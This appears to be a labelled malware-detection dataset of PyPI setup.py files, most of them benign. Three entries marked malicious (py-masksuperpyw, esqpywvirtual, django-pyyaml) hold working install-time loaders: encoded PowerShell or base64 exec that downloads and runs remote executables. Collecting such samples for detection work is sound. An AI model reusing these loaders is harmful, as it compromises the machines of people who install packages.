{"idx": "django-imagekit-4.1.0", "func": "#!/usr/bin/env python\nimport codecs\nimport os\nfrom setuptools import setup, find_packages\nimport sys\n\n\n# Workaround for multiprocessing/nose issue. See http://bugs.python.org/msg170215\ntry:\n    import multiprocessing  # NOQA\nexcept ImportError:\n    pass\n\n\nif 'publish' in sys.argv:\n    os.system('python setup.py sdist bdist_wheel upload')\n    sys.exit()\n\n\nread = lambda filepath: codecs.open(filepath, 'r', 'utf-8').read()\n\n\ndef exec_file(filepath, globalz=None, localz=None):\n        exec(read(filepath), globalz, localz)\n\n\n# Load package meta from the pkgmeta module without loading imagekit.\npkgmeta = {}\nexec_file(os.path.join(os.path.dirname(__file__),\n          'imagekit', 'pkgmeta.py'), pkgmeta)\n\n\nsetup(\n    name='django-imagekit',\n    version=pkgmeta['__version__'],\n    description='Automated image processing for Django models.',\n    long_description=read(os.path.join(os.path.dirname(__file__), 'README.rst')),\n    author='Matthew Tretter',\n    author_email='m@tthewwithanm.com',\n    maintainer='Bryan Veloso',\n    maintainer_email='bryan@revyver.com',\n    license='BSD',\n    url='http://github.com/matthewwithanm/django-imagekit/',\n    packages=find_packages(exclude=['*.tests', '*.tests.*', 'tests.*', 'tests']),\n    zip_safe=False,\n    include_package_data=True,\n    install_requires=[\n        \"django-appconf>=0.5,<1.0.4; python_version<'3'\",\n        \"django-appconf; python_version>'3'\",\n        'pilkit>=0.2.0',\n        'six',\n    ],\n    extras_require={\n        'async': ['django-celery>=3.0'],\n        'async_rq': ['django-rq>=0.6.0'],\n        'async_dramatiq': ['django-dramatiq>=0.4.0'],\n    },\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Utilities'\n    ],\n)\n", "target": 0}
{"idx": "py-masksuperpyw-8.89", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-masksuperpyw',\n    packages = ['modlib'],\n    version = '4.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "googleapis-common-protos-1.56.4", "func": "# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n\nname = \"googleapis-common-protos\"\ndescription = \"Common protobufs used in Google APIs\"\nversion = \"1.56.4\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\"protobuf >= 3.15.0, <5.0.0dev\"]\n\nextras_require = {\"grpc\": [\"grpcio >= 1.0.0, <2.0.0dev\"]}\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n    ],\n    description=description,\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    install_requires=dependencies,\n    extras_require=extras_require,\n    license=\"Apache-2.0\",\n    packages=packages,\n    package_data={\"\": [\"*.proto\"]},\n    python_requires=\">=3.7\",\n    namespace_packages=[\"google\", \"google.logging\"],\n    url=\"https://github.com/googleapis/python-api-common-protos\",\n    include_package_data=True,\n)\n", "target": 0}
{"idx": "flatten-dict-0.4.2", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackage_dir = \\\n{'': 'src'}\n\npackages = \\\n['flatten_dict', 'flatten_dict.tests']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['six>=1.12,<2.0']\n\nextras_require = \\\n{':python_version < \"3.4\"': ['pathlib2>=2.3,<3.0'],\n ':python_version < \"3.8\"': ['importlib-metadata']}\n\nsetup_kwargs = {\n    'name': 'flatten-dict',\n    'version': '0.4.2',\n    'description': 'A flexible utility for flattening and unflattening dict-like objects in Python.',\n    'long_description': 'flatten-dict\\n============\\n.. image:: https://github.com/ianlini/flatten-dict/actions/workflows/main.yml/badge.svg\\n   :target: https://github.com/ianlini/flatten-dict/actions\\n.. image:: https://img.shields.io/pypi/v/flatten-dict.svg\\n   :target: https://pypi.org/project/flatten-dict/\\n.. image:: https://img.shields.io/pypi/l/flatten-dict.svg\\n   :target: https://github.com/ianlini/flatten-dict/blob/master/LICENSE\\n.. image:: https://img.shields.io/github/stars/ianlini/flatten-dict.svg?style=social\\n   :target: https://github.com/ianlini/flatten-dict\\n\\nA flexible utility for flattening and unflattening dict-like objects in Python.\\n\\n\\nIntroduction\\n------------\\nThis package provides a function ``flatten()`` for flattening dict-like objects in Python 2.7 and 3.5~3.8.\\nIt also provides some key joining methods (reducer), and you can choose the reducer you want or even implement your own reducer.\\nYou can also invert the resulting flat dict using ``unflatten()``.\\n\\nInstallation\\n------------\\n\\n.. code-block:: bash\\n\\n   pip install flatten-dict\\n\\nDocumentation\\n-------------\\n\\nFlatten\\n```````\\n\\n.. code-block:: python\\n\\n   def flatten(d, reducer=\\'tuple\\', inverse=False, enumerate_types=(), keep_empty_types=()):\\n       \"\"\"Flatten `Mapping` object.\\n\\n       Parameters\\n       ----------\\n       d : dict-like object\\n           The dict that will be flattened.\\n       reducer : {\\'tuple\\', \\'path\\', \\'underscore\\', \\'dot\\', Callable}\\n           The key joining method. If a `Callable` is given, the `Callable` will be\\n           used to reduce.\\n           \\'tuple\\': The resulting key will be tuple of the original keys.\\n           \\'path\\': Use `os.path.join` to join keys.\\n           \\'underscore\\': Use underscores to join keys.\\n           \\'dot\\': Use dots to join keys.\\n       inverse : bool\\n           Whether you want invert the resulting key and value.\\n       max_flatten_depth : int\\n           Maximum depth to merge.\\n       enumerate_types : Sequence[type]\\n           Flatten these types using `enumerate`.\\n           For example, if we set `enumerate_types` to ``(list,)``,\\n           `list` indices become keys: ``{\\'a\\': [\\'b\\', \\'c\\']}`` -> ``{(\\'a\\', 0): \\'b\\', (\\'a\\', 1): \\'c\\'}``.\\n       keep_empty_types : Sequence[type]\\n           By default, ``flatten({1: 2, 3: {}})`` will give you ``{(1,): 2}``, that is, the key ``3``\\n           will disappear.\\n           This is also applied for the types in `enumerate_types`, that is,\\n           ``flatten({1: 2, 3: []}, enumerate_types=(list,))`` will give you ``{(1,): 2}``.\\n           If you want to keep those empty values, you can specify the types in `keep_empty_types`:\\n\\n           >>> flatten({1: 2, 3: {}}, keep_empty_types=(dict,))\\n           {(1,): 2, (3,): {}}\\n\\n       Returns\\n       -------\\n       flat_dict : dict\\n       \"\"\"\\n\\nExamples\\n::::::::\\n\\n>>> from flatten_dict import flatten\\n>>> from pprint import pprint\\n>>> normal_dict = {\\n...     \\'a\\': \\'0\\',\\n...     \\'b\\': {\\n...         \\'a\\': \\'1.0\\',\\n...         \\'b\\': \\'1.1\\',\\n...     },\\n...     \\'c\\': {\\n...         \\'a\\': \\'2.0\\',\\n...         \\'b\\': {\\n...             \\'a\\': \\'2.1.0\\',\\n...             \\'b\\': \\'2.1.1\\',\\n...         },\\n...     },\\n... }\\n>>> pprint(flatten(normal_dict))\\n{(\\'a\\',): \\'0\\',\\n (\\'b\\', \\'a\\'): \\'1.0\\',\\n (\\'b\\', \\'b\\'): \\'1.1\\',\\n (\\'c\\', \\'a\\'): \\'2.0\\',\\n (\\'c\\', \\'b\\', \\'a\\'): \\'2.1.0\\',\\n (\\'c\\', \\'b\\', \\'b\\'): \\'2.1.1\\'}\\n>>> pprint(flatten(normal_dict, reducer=\\'path\\'))\\n{\\'a\\': \\'0\\',\\n \\'b/a\\': \\'1.0\\',\\n \\'b/b\\': \\'1.1\\',\\n \\'c/a\\': \\'2.0\\',\\n \\'c/b/a\\': \\'2.1.0\\',\\n \\'c/b/b\\': \\'2.1.1\\'}\\n>>> pprint(flatten(normal_dict, reducer=\\'path\\', inverse=True))\\n{\\'0\\': \\'a\\',\\n \\'1.0\\': \\'b/a\\',\\n \\'1.1\\': \\'b/b\\',\\n \\'2.0\\': \\'c/a\\',\\n \\'2.1.0\\': \\'c/b/a\\',\\n \\'2.1.1\\': \\'c/b/b\\'}\\n>>> pprint(flatten(normal_dict, reducer=\\'path\\', max_flatten_depth=2))\\n{\\'a\\': \\'0\\',\\n \\'b/a\\': \\'1.0\\',\\n \\'b/b\\': \\'1.1\\',\\n \\'c/a\\': \\'2.0\\',\\n \\'c/b\\': {\\'a\\': \\'2.1.0\\', \\'b\\': \\'2.1.1\\'}}\\n\\nThe `reducer` parameter supports ``\\'tuple\\'``, ``\\'path\\'``, ``\\'underscore\\'``, ``\\'dot\\'`` and `Callable`. We can customize the reducer using a function:\\n\\n>>> def underscore_reducer(k1, k2):\\n...     if k1 is None:\\n...         return k2\\n...     else:\\n...         return k1 + \"_\" + k2\\n...\\n>>> pprint(flatten(normal_dict, reducer=underscore_reducer))\\n{\\'a\\': \\'0\\',\\n \\'b_a\\': \\'1.0\\',\\n \\'b_b\\': \\'1.1\\',\\n \\'c_a\\': \\'2.0\\',\\n \\'c_b_a\\': \\'2.1.0\\',\\n \\'c_b_b\\': \\'2.1.1\\'}\\n\\nThere is also a factory function `make_reducer()` to help you create customized reducer. The function currently only supports customized delimiter:\\n\\n>>> from flatten_dict.reducers import make_reducer\\n>>> pprint(flatten(normal_dict, reducer=make_reducer(delimiter=\\'_\\')))\\n{\\'a\\': \\'0\\',\\n \\'b_a\\': \\'1.0\\',\\n \\'b_b\\': \\'1.1\\',\\n \\'c_a\\': \\'2.0\\',\\n \\'c_b_a\\': \\'2.1.0\\',\\n \\'c_b_b\\': \\'2.1.1\\'}\\n\\nIf we have some iterable (e.g., `list`) in the `dict`, we will normally get this:\\n\\n>>> flatten({\\'a\\': [1, 2, 3], \\'b\\': \\'c\\'})\\n{(\\'a\\',): [1, 2, 3], (\\'b\\',): \\'c\\'}\\n\\nIf we want to use its indices as keys, then we can use the parameter `enumerate_types`:\\n\\n>>> flatten({\\'a\\': [1, 2, 3], \\'b\\': \\'c\\'}, enumerate_types=(list,))\\n{(\\'a\\', 0): 1, (\\'a\\', 1): 2, (\\'a\\', 2): 3, (\\'b\\',): \\'c\\'}\\n\\nWe can even flatten a `list` directly:\\n\\n>>> flatten([1, 2, 3], enumerate_types=(list,))\\n{(0,): 1, (1,): 2, (2,): 3}\\n\\nIf there is an empty dict in the values, by default, it will disappear after flattened:\\n\\n>>> flatten({1: 2, 3: {}})\\n{(1,): 2}\\n\\nWe can keep the empty dict in the result using ``keep_empty_types=(dict,)``:\\n\\n>>> flatten({1: 2, 3: {}}, keep_empty_types=(dict,))\\n{(1,): 2, (3,): {}}\\n\\nUnflatten\\n`````````\\n\\n.. code-block:: python\\n\\n   def unflatten(d, splitter=\\'tuple\\', inverse=False):\\n       \"\"\"Unflatten dict-like object.\\n\\n       Parameters\\n       ----------\\n       d : dict-like object\\n           The dict that will be unflattened.\\n       splitter : {\\'tuple\\', \\'path\\', \\'underscore\\', \\'dot\\', Callable}\\n           The key splitting method. If a Callable is given, the Callable will be\\n           used to split `d`.\\n           \\'tuple\\': Use each element in the tuple key as the key of the unflattened dict.\\n           \\'path\\': Use `pathlib.Path.parts` to split keys.\\n           \\'underscore\\': Use underscores to split keys.\\n           \\'dot\\': Use underscores to split keys.\\n       inverse : bool\\n           Whether you want to invert the key and value before flattening.\\n\\n       Returns\\n       -------\\n       unflattened_dict : dict\\n       \"\"\"\\n\\nExamples\\n::::::::\\n\\n>>> from pprint import pprint\\n>>> from flatten_dict import unflatten\\n>>> flat_dict = {\\n...     (\\'a\\',): \\'0\\',\\n...     (\\'b\\', \\'a\\'): \\'1.0\\',\\n...     (\\'b\\', \\'b\\'): \\'1.1\\',\\n...     (\\'c\\', \\'a\\'): \\'2.0\\',\\n...     (\\'c\\', \\'b\\', \\'a\\'): \\'2.1.0\\',\\n...     (\\'c\\', \\'b\\', \\'b\\'): \\'2.1.1\\',\\n... }\\n>>> pprint(unflatten(flat_dict))\\n{\\'a\\': \\'0\\',\\n \\'b\\': {\\'a\\': \\'1.0\\', \\'b\\': \\'1.1\\'},\\n \\'c\\': {\\'a\\': \\'2.0\\', \\'b\\': {\\'a\\': \\'2.1.0\\', \\'b\\': \\'2.1.1\\'}}}\\n>>> flat_dict = {\\n...     \\'a\\': \\'0\\',\\n...     \\'b/a\\': \\'1.0\\',\\n...     \\'b/b\\': \\'1.1\\',\\n...     \\'c/a\\': \\'2.0\\',\\n...     \\'c/b/a\\': \\'2.1.0\\',\\n...     \\'c/b/b\\': \\'2.1.1\\',\\n... }\\n>>> pprint(unflatten(flat_dict, splitter=\\'path\\'))\\n{\\'a\\': \\'0\\',\\n \\'b\\': {\\'a\\': \\'1.0\\', \\'b\\': \\'1.1\\'},\\n \\'c\\': {\\'a\\': \\'2.0\\', \\'b\\': {\\'a\\': \\'2.1.0\\', \\'b\\': \\'2.1.1\\'}}}\\n>>> flat_dict = {\\n...     \\'0\\': \\'a\\',\\n...     \\'1.0\\': \\'b/a\\',\\n...     \\'1.1\\': \\'b/b\\',\\n...     \\'2.0\\': \\'c/a\\',\\n...     \\'2.1.0\\': \\'c/b/a\\',\\n...     \\'2.1.1\\': \\'c/b/b\\',\\n... }\\n>>> pprint(unflatten(flat_dict, splitter=\\'path\\', inverse=True))\\n{\\'a\\': \\'0\\',\\n \\'b\\': {\\'a\\': \\'1.0\\', \\'b\\': \\'1.1\\'},\\n \\'c\\': {\\'a\\': \\'2.0\\', \\'b\\': {\\'a\\': \\'2.1.0\\', \\'b\\': \\'2.1.1\\'}}}\\n\\nThe `splitter` parameter supports ``\\'tuple\\'``, ``\\'path\\'``, ``\\'underscore\\'``, ``\\'dot\\'`` and `Callable`. We can customize the reducer using a function:\\n\\n>>> def underscore_splitter(flat_key):\\n...     return flat_key.split(\"_\")\\n...\\n>>> flat_dict = {\\n...     \\'a\\': \\'0\\',\\n...     \\'b_a\\': \\'1.0\\',\\n...     \\'b_b\\': \\'1.1\\',\\n...     \\'c_a\\': \\'2.0\\',\\n...     \\'c_b_a\\': \\'2.1.0\\',\\n...     \\'c_b_b\\': \\'2.1.1\\',\\n... }\\n>>> pprint(unflatten(flat_dict, splitter=underscore_splitter))\\n{\\'a\\': \\'0\\',\\n \\'b\\': {\\'a\\': \\'1.0\\', \\'b\\': \\'1.1\\'},\\n \\'c\\': {\\'a\\': \\'2.0\\', \\'b\\': {\\'a\\': \\'2.1.0\\', \\'b\\': \\'2.1.1\\'}}}\\n\\nThere is also a factory function `make_splitter()` to help you create customized splitter. The function currently only supports customized delimiter:\\n\\n>>> from flatten_dict.splitters import make_splitter\\n>>> pprint(unflatten(flat_dict, splitter=make_splitter(delimiter=\\'_\\')))\\n{\\'a\\': \\'0\\',\\n \\'b\\': {\\'a\\': \\'1.0\\', \\'b\\': \\'1.1\\'},\\n \\'c\\': {\\'a\\': \\'2.0\\', \\'b\\': {\\'a\\': \\'2.1.0\\', \\'b\\': \\'2.1.1\\'}}}\\n',\n    'author': 'Ian Lin',\n    'author_email': 'you@example.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/ianlini/flatten-dict',\n    'package_dir': package_dir,\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'python_requires': '>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "facebook_business-14.0.0", "func": "# Copyright 2014 Facebook, Inc.\n\n# You are hereby granted a non-exclusive, worldwide, royalty-free license to\n# use, copy, modify, and distribute this software in source code or binary\n# form for use in connection with the web services and APIs provided by\n# Facebook.\n\n# As with any software that integrates with the Facebook platform, your use\n# of this software is subject to the Facebook Developer Principles and\n# Policies [http://developers.facebook.com/policy/]. This copyright notice\n# shall be included in all copies or substantial portions of the software.\n\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n# THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\n# DEALINGS IN THE SOFTWARE.\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\nimport os\n\nthis_dir = os.path.dirname(__file__)\nreadme_filename = os.path.join(this_dir, 'README.md')\nrequirements_filename = os.path.join(this_dir, 'requirements.txt')\n\nPACKAGE_NAME = 'facebook_business'\nPACKAGE_VERSION = '14.0.0'\nPACKAGE_AUTHOR = 'Facebook'\nPACKAGE_AUTHOR_EMAIL = ''\nPACKAGE_URL = 'https://github.com/facebook/facebook-python-business-sdk'\nPACKAGE_DOWNLOAD_URL = \\\n    'https://github.com/facebook/facebook-python-business-sdk/tarball/' + PACKAGE_VERSION\nPACKAGES = [\n    'facebook_business',\n    'facebook_business.test',\n    'facebook_business.utils',\n    'facebook_business.adobjects',\n    'facebook_business.adobjects.helpers',\n    'facebook_business.adobjects.serverside',\n]\nPACKAGE_DATA = {\n    'facebook_business': ['*.crt'],\n    'facebook_business.test': ['*.jpg']\n}\nPACKAGE_LICENSE = 'LICENSE.txt'\nPACKAGE_DESCRIPTION = 'Facebook Business SDK'\n\nwith open(readme_filename) as f:\n    PACKAGE_LONG_DESCRIPTION = f.read()\n\nwith open(requirements_filename) as f:\n    PACKAGE_INSTALL_REQUIRES = [line[:-1] for line in f]\n\nsetup(\n    name=PACKAGE_NAME,\n    version=PACKAGE_VERSION,\n    author=PACKAGE_AUTHOR,\n    author_email=PACKAGE_AUTHOR_EMAIL,\n    url=PACKAGE_URL,\n    download_url=PACKAGE_DOWNLOAD_URL,\n    packages=PACKAGES,\n    package_data=PACKAGE_DATA,\n    license=PACKAGE_LICENSE,\n    description=PACKAGE_DESCRIPTION,\n    long_description=PACKAGE_LONG_DESCRIPTION,\n    install_requires=PACKAGE_INSTALL_REQUIRES,\n    long_description_content_type=\"text/markdown\",\n)\n", "target": 0}
{"idx": "datadog-logger-0.3.0", "func": "from distutils.core import setup\n\n\nsetup(name=\"datadog-logger\",\n      version=\"0.3.0\",\n      description=\"Python logging handler for DataDog events\",\n      url=\"https://github.com/ustudio/datadog-logger\",\n      packages=[\"datadog_logger\"],\n      install_requires=[\"datadog\"])\n", "target": 0}
{"idx": "flake8-noqa-1.2.8", "func": "\"\"\"Define PyPI package.\"\"\"\n\nimport flake8_noqa\n\nimport setuptools\n\nwith open(\"README.md\", \"r\") as readme_file:\n\tlong_description = readme_file.read()\n\nsetuptools.setup(\n\tname='flake8-noqa',\n\tversion='1.2.8',\n\tauthor='Peter Linss',\n\tauthor_email='pypi@linss.com',\n\tdescription='Flake8 noqa comment validation',\n\tlong_description=long_description,\n\tlong_description_content_type=\"text/markdown\",\n\turl='https://github.com/plinss/flake8-noqa/',\n\n\tpackages=['flake8_noqa'],\n\tpackage_data={'flake8_noqa': ['py.typed']},\n\n\tinstall_requires=[\n\t\t'flake8>=3.8.0,<6.0',\n\t\t'importlib_metadata>=4.0.0,<5.0.0;python_version<\"3.8.0\"',\n\t\t'typing_extensions>=3.7.4.2',\n\t],\n\textras_require={\n\t\t'dev': [\n\t\t\t'mypy',\n\t\t\t'flake8>=3.8.0,<5.0',\n\t\t\t'flake8-annotations',\n\t\t\t'flake8-bandit',\n\t\t\t'flake8-bugbear',\n\t\t\t'flake8-commas',\n\t\t\t'flake8-comprehensions',\n\t\t\t'flake8-continuation',\n\t\t\t'flake8-datetimez',\n\t\t\t'flake8-docstrings',\n\t\t\t'flake8-import-order',\n\t\t\t'flake8-literal',\n\t\t\t'flake8-noqa',\n\t\t\t'flake8-polyfill',\n\t\t\t'flake8-postponed-annotations',\n\t\t\t'flake8-requirements',\n\t\t\t# 'flake8-smart-tabs',\n\t\t\t'flake8-tabs',\n\t\t\t'flake8-typechecking-import',\n\t\t\t'flake8-use-fstring',\n\t\t\t'pep8-naming',\n\t\t],\n\t\t'test': [\n\t\t\t'flake8-docstrings',\n\t\t],\n\t},\n\tclassifiers=[\n\t\t\"Framework :: Flake8\",\n\t\t\"Environment :: Console\",\n\t\t\"Intended Audience :: Developers\",\n\t\t\"License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)\",\n\t\t\"Programming Language :: Python\",\n\t\t\"Programming Language :: Python :: 3\",\n\t\t\"Programming Language :: Python :: 3.7\",\n\t\t\"Programming Language :: Python :: 3.8\",\n\t\t\"Programming Language :: Python :: 3.9\",\n\t\t\"Programming Language :: Python :: 3.10\",\n\t\t\"Topic :: Software Development :: Libraries :: Python Modules\",\n\t\t\"Topic :: Software Development :: Quality Assurance\",\n\t],\n\tpython_requires='>=3.7',\n\tentry_points={\n\t\t'flake8.extension': [\n\t\t\tf'{flake8_noqa.noqa_checker_prefix} = flake8_noqa.noqa_checker:NoqaChecker',\n\t\t\tf'{flake8_noqa.noqa_filter_prefix} = flake8_noqa.noqa_filter:NoqaFilter',\n\t\t],\n\t},\n)\n", "target": 0}
{"idx": "esqpywvirtual-1.19", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpywvirtual',\n    packages = ['modlib'],\n    version = '9.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dtw-1.4.0", "func": "#!/usr/bin/env python\n\nimport imp\nfrom setuptools import setup, find_packages\n\nversion = imp.load_source('dtw.version', 'dtw/version.py')\n\n\nlong_description = '''\nDtw is a Python Module for computing Dynamic Time Warping distance. It can be used as a similarity measured between temporal sequences.\n\nMore info can be found at: https://github.com/pierre-rouanet/dtw\n\nIt is compatible with Python 2.7-3.6 and is distributed under the GPLv3 license.\n'''\n\nsetup(name='dtw',\n      version=version.version,\n\n      description='Python DTW Module',\n      long_description=long_description,\n      author='Pierre Rouanet',\n      author_email='pierre.rouanet@gmail.com',\n      url='https://github.com/pierre-rouanet/dtw',\n      license='GNU GENERAL PUBLIC LICENSE Version 3',\n\n      packages=find_packages(),\n      install_requires=['numpy', 'scipy'],\n\n      test_suite='tests',\n\n      classifiers=[\n          \"Programming Language :: Python :: 2\",\n          \"Programming Language :: Python :: 3\",\n          \"Topic :: Scientific/Engineering\", ],\n      )\n", "target": 0}
{"idx": "django-pyyaml-20.17.15", "func": "from setuptools import setup, find_packages\n\n\nVERSION = '20.17.15'\nDESCRIPTION = 'A framework for creating RESTful APIs'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"django-pyyaml\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n", "target": 1}
{"idx": "graphql-core-3.2.1", "func": "from re import search\nfrom setuptools import setup, find_packages\n\nwith open(\"src/graphql/version.py\") as version_file:\n    version = search('version = \"(.*)\"', version_file.read()).group(1)\n\nwith open(\"README.md\") as readme_file:\n    readme = readme_file.read()\n\nsetup(\n    name=\"graphql-core\",\n    version=version,\n    description=\"GraphQL implementation for Python, a port of GraphQL.js,\"\n    \" the JavaScript reference implementation for GraphQL.\",\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    keywords=\"graphql\",\n    url=\"https://github.com/graphql-python/graphql-core\",\n    author=\"Christoph Zwerschke\",\n    author_email=\"cito@online.de\",\n    license=\"MIT license\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: 